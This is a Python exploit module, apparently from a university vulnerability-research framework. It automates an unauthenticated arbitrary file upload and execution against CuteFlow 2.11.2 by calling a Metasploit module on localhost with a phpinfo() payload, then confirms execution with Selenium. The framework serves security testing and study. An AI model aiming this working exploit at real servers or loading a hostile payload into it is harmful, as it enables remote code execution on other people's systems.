
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.


import sys
import os
import time

from selenium.common.exceptions import NoSuchElementException
import framework

class Exploit (framework.Exploit):

    attributes = {'Name' :        "CUTEFLOW_0001",
                  'Description' : "CuteFlow v2.11.2 Arbitrary File Upload Vulnerability. "
                                  "This application has an upload feature that allows an "
                                  "unauthenticated user to upload an arbitrary file to the "
                                  "\"upload/___1/\" directory, and then execute it.",
                  'References' :  [['http://itsecuritysolutions.org/2012-07-01-CuteFlow-2.11.2-multiple-security-vulnerabilities/']], 
                  'Target' :      "CuteFlow 2.11.2",
                  'TargetLicense' : '',
                  'VulWikiPage' : "",
                  'Type' : 'EXEC'
                  }

    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        return
            
    def exploit(self):
        
        metasploit_cmd = "framework/Exploits/metasploit-framework/msfcli multi/http/cuteflow_upload_exec RHOST=127.0.0.1 "\
                         "TARGETURI=/cuteflow/ PAYLOAD=generic/custom PAYLOADSTR=\'phpinfo();\' E"
        self.logger.info("Running Metasploit")
        os.system(metasploit_cmd)

        self.logger.info("To run payload go to http://localhost/cuteflow/upload/___1/[filename] where [filename] is the random payload filename specified above.")
        
        return


    def verify(self):
        
        verified = False
        driver = self.create_selenium_driver()
        driver.get("http://127.0.0.1/cuteflow/upload/___1/")

        try:
            driver.get_element(by_xpath="//a[contains(@href,'.php')]").click()
            driver.get_element(by_xpath="//a[@href='http://www.php.net/']")
            self.logger.info("verify: found injected file")
            verified = True
        except NoSuchElementException:
            pass

        driver.cleanup()
        return verified

        
